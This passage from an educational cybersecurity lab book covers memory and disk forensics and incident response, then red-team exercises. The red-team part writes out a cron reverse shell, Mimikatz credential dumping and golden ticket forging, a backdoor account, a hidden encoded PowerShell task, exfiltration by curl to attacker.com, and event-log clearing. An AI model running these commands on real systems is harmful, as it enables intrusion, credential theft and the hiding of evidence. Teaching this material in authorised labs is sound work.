   volatility -f memory.dump --profile=Win10x64_19041 pslist
   ```

4. **Detect Suspicious Processes**:
   ```bash
   volatility -f memory.dump --profile=Win10x64_19041 malfind
   ```

5. **Extract Process Memory**:
   ```bash
   volatility -f memory.dump --profile=Win10x64_19041 memdump -p [PID] -D dump/
   ```

6. **Analyze Network Connections**:
   ```bash
   volatility -f memory.dump --profile=Win10x64_19041 netscan
   ```

7. **Extract Artifacts**:
   ```bash
   volatility -f memory.dump --profile=Win10x64_19041 filescan
   volatility -f memory.dump --profile=Win10x64_19041 registry
   ```

#### **Observations**
- Identified malicious processes
- Found injected code in system processes
- Discovered attacker C2 connections
- Extracted files from memory

#### **Findings Report**
| Process | PID | Parent PID | Status | Risk Level | Notes |
|---------|-----|-----------|--------|-----------|-------|
| explorer.exe | 1420 | 784 | Normal | Low | System process |
| svchost.exe | 892 | 644 | Normal | Low | System service |
| rundll32.exe | 3456 | 1420 | Suspicious | High | Unusual parent, no command line |
| iexplore.exe | 2145 | 3456 | Malicious | Critical | Injected code, C2 connection |

---

### **Task 5.2: Disk Forensics using Autopsy**

#### **Objective**
Perform disk image analysis, recover deleted files, and analyze file system artifacts.

#### **Procedure**

1. **Create Disk Image**:
   ```bash
   sudo dd if=/dev/sda1 of=disk_image.dd bs=4M conv=noerror
   ```

2. **Open in Autopsy**:
   ```bash
   autopsy
   # Create new case
   # Import disk image
   ```

3. **File System Analysis**:
   - Analyze Master File Table (MFT)
   - Check for deleted files
   - Examine file timestamps

4. **Recover Deleted Files**:
   - Mark unallocated clusters
   - Recover with proper file signatures

5. **Timeline Analysis**:
   - Create timeline of file access
   - Identify suspicious activities

6. **Search for Artifacts**:
   - Web browser history
   - Recent documents
   - Chat applications

#### **Observations**
- Recovered deleted files containing evidence
- Identified attacker's activity timeline
- Found suspicious file modifications

---

### **Task 5.3: Log Analysis and Threat Hunting**

#### **Objective**
Analyze security logs to detect suspicious activities and conduct threat hunting.

#### **Procedure**

1. **Aggregate Logs** (Splunk/ELK):
   ```bash
   # Index Windows Event Logs
   index=windows eventID=4688
   ```

2. **Hunt for Lateral Movement**:
   ```
   index=windows eventID=4624 
   | stats count by host, user, src_ip
   | where count > 10
   ```

3. **Detect Privilege Escalation**:
   ```
   index=windows eventID=4672 (admin OR system)
   ```

4. **Find Command Execution**:
   ```
   index=windows eventID=4688 CommandLine=*powershell*
   ```

5. **Analyze Network Logs**:
   ```
   index=network dest_ip=external protocol=dns
   | stats count by dest_domain
   | sort - count
   ```

6. **Identify Data Exfiltration**:
   ```
   index=network bytes_out > 1000000000
   | stats sum(bytes_out) by dest_ip, user
   ```

#### **Observations**
| Threat | Log Source | Evidence | Confidence | Severity |
|--------|-----------|----------|-----------|----------|
| Lateral movement | Windows Events (4624) | 50+ failed login attempts on multiple systems | High | Critical |
| Privilege escalation | Windows Events (4672) | SYSTEM token assignment to user process | High | Critical |
| Data exfiltration | Firewall logs | 500+ GB to external IP | Medium | High |
| Malware execution | Process creation logs | powershell.exe with obfuscated script | Medium | High |

---

### **Task 5.4: Incident Response Simulation**

#### **Objective**
Simulate an incident response scenario from detection to containment and recovery.

#### **Scenario**
*A suspicious user account "compromised_user" has been observed transferring large amounts of data to external IP addresses. Initial analysis suggests a possible breach. You are tasked to investigate, contain, and recover.*

#### **Procedure**

1. **Detection & Analysis**:
   ```
   index=network user=compromised_user bytes_out > 1GB
   ```

2. **Containment Actions**:
   ```bash
   # Disable user account
   net user compromised_user /active:no
   
   # Reset password
   net user compromised_user NewP@ssw0rd123
   
   # Revoke sessions
   taskkill /F /IM explorer.exe
   ```

3. **Forensic Collection**:
   ```bash
   # Preserve evidence
   dd if=/dev/sda1 of=forensic_image.dd
   tar czf logs_backup.tar.gz /var/log/
   ```

4. **Scope Assessment**:
   ```
   - Determine initial compromise date
   - Identify compromised systems
   - Find lateral movement paths
   - Assess data exposure
   ```

5. **Eradication**:
   ```bash
   # Remove malware
   # Patch vulnerabilities
   # Change credentials
   ```

6. **Recovery**:
   ```bash
   # Rebuild affected systems
   # Restore from clean backups
   # Monitor for re-infection
   ```

7. **Post-Incident**:
   ```
   - Conduct post-mortem
   - Update security controls
   - Training and awareness
   - Improved monitoring rules
   ```

#### **Incident Report**
- Timeline of events
- Attack vector and root cause
- Scope of compromise
- Remediation steps
- Preventive measures
- Lessons learned

---

## **Lab 5 Summary & Incident Response Best Practices**

1. Maintain comprehensive logging and monitoring
2. Develop incident response plan and procedures
3. Conduct regular threat hunting exercises
4. Preserve forensic artifacts and chain of custody
5. Perform regular backup and disaster recovery drills
6. Train incident response team
7. Implement SIEM for log aggregation and analysis
8. Maintain secure evidence storage and access controls

---

# **LAB 6: RED TEAMING AND ADVANCED EXPLOITATION**

## **Objective**
To simulate real-world cyber attacks using red teaming methodologies, including privilege escalation, lateral movement, social engineering, and post-exploitation tactics.

## **Course Outcome(s) Addressed**
- **CO6**: Implement red teaming methodologies, privilege escalation, and social engineering tactics.

---

## **TASKS**

### **Task 6.1: Privilege Escalation Techniques**

#### **Objective**
Escalate privileges from user to administrator/root on Windows and Linux systems.

#### **Procedure - Windows**

1. **Identify Privilege Escalation Vectors**:
   ```bash
   # Check current privileges
   whoami /priv
   
   # Check UAC status
   Get-UAC
   ```

2. **Token Impersonation** (using Mimikatz):
   ```powershell
   # List available tokens
   mimikatz "token::list"
   
   # Impersonate SYSTEM token
   mimikatz "token::elevate"
   ```

3. **Exploit Service Vulnerabilities**:
   ```bash
   # Check service permissions
   accesschk.exe -uwcs "C:\Program Files\Vulnerable Service"
   
   # Replace service executable
   copy malicious.exe "C:\Program Files\Vulnerable Service\app.exe"
   ```

4. **DLL Hijacking**:
   ```bash
   # Find unquoted service paths
   wmic service list brief | findstr /i unquoted
   ```

5. **Exploit Windows Kernel Vulnerabilities**:
   ```bash
   # CVE-2021-1732 (Win10 LPE)
   # Use exploit kit
   ```

#### **Procedure - Linux**

1. **Check Sudo Privileges**:
   ```bash
   sudo -l
   ```

2. **SUID Exploitation**:
   ```bash
   # Find SUID binaries
   find / -perm -4000 2>/dev/null
   
   # Check for vulnerable SUID
   ./vulnerable_suid -c "/bin/sh"
   ```

3. **Exploit Kernel Vulnerabilities**:
   ```bash
   # CVE-2021-22555 (Netfilter Vulnerability)
   # Use kernel exploit
   ```

4. **Cron Job Exploitation**:
   ```bash
   # Find writable cron scripts
   ls -la /etc/cron.d/
   
   # Add reverse shell to cron job
   echo "* * * * * bash -i >& /dev/tcp/192.168.1.10/4444 0>&1" >> /var/spool/cron/crontabs/root
   ```

#### **Observations**
- Successfully escalated from user to admin/root
- Identified privilege escalation vectors
- Documented exploitation process

---

### **Task 6.2: Lateral Movement Techniques**

#### **Objective**
Move across network from one compromised system to another.

#### **Procedure**

1. **Network Reconnaissance**:
   ```bash
   arp -a
   netstat -an | grep ESTABLISHED
   ```

2. **Credential Harvesting**:
   ```bash
   # Extract from memory
   mimikatz "privilege::debug" "sekurlsa::logonpasswords"
   
   # Extract from registry
   reg save HKLM\SAM sam.hive
   ```

3. **Pass-the-Hash Attack**:
   ```bash
   # Using harvested NTLM hashes
   pth-winexe -U DOMAIN/USER%HASH //TARGET_IP cmd.exe
   ```

4. **Use Golden Ticket** (if DC is compromised):
   ```bash
   # Forge golden ticket for domain admin
   mimikatz "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash"
   ```

5. **Pivot to Other Systems**:
   ```bash
   # Use psexec to execute commands on other systems
   psexec \\TARGET_IP -u DOMAIN\USER -p PASSWORD cmd.exe
   ```

#### **Observations**
- Moved to 3+ systems within network
- Harvested credentials from intermediate systems
- Maintained persistence

---

### **Task 6.3: Social Engineering Attacks**

#### **Objective**
Conduct social engineering campaigns to demonstrate human vulnerabilities.

#### **Procedure**

1. **Phishing Email Campaign**:
   ```bash
   # Using gophish or similar tool
   # Craft convincing phishing email
   # Setup fake login page
   # Send to target
   # Capture credentials
   ```

2. **USB Baiting**:
   ```
   - Create infected USB drive with autorun script
   - Leave in public area
   - Document when/if plugged in
   ```

3. **Physical Security Bypass**:
   ```
   - Tailgating into restricted areas
   - Social engineering for badge access
   - Dumpster diving for sensitive documents
   ```

4. **Pretext Phone Call**:
   ```
   - Impersonate IT support
   - Request password reset
   - Extract sensitive information
   ```

#### **Observations**
- Phishing click-through rate
- Credential capture statistics
- Physical security vulnerabilities
- Employee awareness gaps

#### **Metrics**
| Campaign | Emails Sent | Opened | Clicked | Credentials Captured | Success Rate |
|----------|------------|--------|---------|-------------------|--------------|
| Banking Phish | 100 | 45 | 22 | 15 | 15% |
| IT Support | 50 | 38 | 18 | 12 | 24% |
| Vendor Invoice | 75 | 52 | 31 | 20 | 26.7% |

---

### **Task 6.4: Post-Exploitation and Data Exfiltration**

#### **Objective**
Establish persistence, exfiltrate data, and cover tracks after compromise.

#### **Procedure**

1. **Establish Persistence**:
   ```bash
   # Create backdoor user account
   net user backdoor P@ssw0rd /add
   
   # Scheduled task for reverse shell
   schtasks /create /tn "System Update" /tr "powershell -NoP -sta -NonI -W Hidden -Enc [BASE64]" /sc minute /mo 5
   ```

2. **Data Exfiltration**:
   ```bash
   # Identify high-value data
   dir C:\Users\*\Documents\*.xlsx
   dir C:\Users\*\Desktop\*credential*
   
   # Compress and encrypt
   7z a -pP@ssw0rd data.7z target_files\
   
   # Exfiltrate via DNS, HTTP, or FTP
   curl -F "file=@data.7z" http://attacker.com/upload
   ```

3. **Cover Tracks**:
   ```bash
   # Clear event logs
   wevtutil cl Application
   wevtutil cl System
   wevtutil cl Security
   
   # Remove command history
   clear
   history -c
   
   # Delete temp files
   cd /tmp && rm -rf *
   ```

4. **Maintain Access**:
   ```bash
   # Install rootkit or backdoor
   # Disable antivirus/EDR
   # Remove monitoring agents
   ```

#### **Observations**
- Successfully established multiple persistence mechanisms
- Exfiltrated sensitive data undetected
- Cleared forensic artifacts

---

## **Lab 6 Red Team Report Structure**

1. **Executive Summary**
   - Objectives and scope
   - Overall success assessment

2. **Detailed Findings**
   - Initial access methodology
   - Privilege escalation path
   - Lateral movement techniques
   - Data exfiltration methods
   - Persistence mechanisms

3. **Risk Assessment**
   - CVSS scores
   - Business impact
   - Likelihood of exploitation

4. **Recommendations**
   - Technical controls
   - Process improvements
   - Training and awareness

5. **Appendices**
   - Screenshots and logs
   - Command execution records
   - Timeline of activities

---


# **REFERENCES & RESOURCES**

## **Books**
- CEH v12 Study Guide - Matt Walker
- The Hacker Playbook 3 - Peter Kim
- The Web Application Hacker's Handbook - Stuttard & Pinto
- Cloud Security Handbook - Eyal Estrin
- Network Forensics - Marty Harris & Terrance Deahl

## **Online Platforms**
- TryHackMe: https://tryhackme.com/
- Hack The Box: https://www.hackthebox.eu/
- PentesterLab: https://pentesterlab.com/
- OWASP WebGoat: https://owasp.org/www-project-webgoat/
- HackingArticles: https://www.hackingarticles.in/

## **Tools Documentation**
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- OWASP ZAP: https://www.zaproxy.org/docs/
- Wireshark: https://www.wireshark.org/docs/
- AWS Documentation: https://docs.aws.amazon.com/

## **Relevant Standards & Frameworks**
- OWASP Top 10
- NIST Cybersecurity Framework
- ISO 27001/27002
- CIS Controls
- SANS Top 25

---


## **Standard Lab Report Structure**

1. **Objective**
2. **Prerequisites**
3. **Tools & Resources**
4. **Environment Setup** (with diagram)
5. **Procedure** (step-by-step)
6. **Observations** (tables, screenshots)
7. **Analysis** (findings, implications)
8. **Questions & Answers**
9. **Security Recommendations**
10. **Conclusion**
11. **References**
12. **Appendices** (additional screenshots, logs)

---

**Lab Book Compiled for**: ASM College, Pune - CSIT Department  
**Valid from**: Academic Year 2025-2026  
**Last Updated**: January 2026  

---

**DISCLAIMER**: This lab book is for educational purposes only. All hacking and penetration testing must be conducted in authorized, controlled lab environments only. Unauthorized access to computer systems is illegal and subject to severe legal penalties under the Indian IT Act 2000 and other applicable laws.

**ETHICAL COMMITMENT**: Students must adhere to strict ethical guidelines, maintain confidentiality, and use knowledge gained only for defensive and protective purposes.
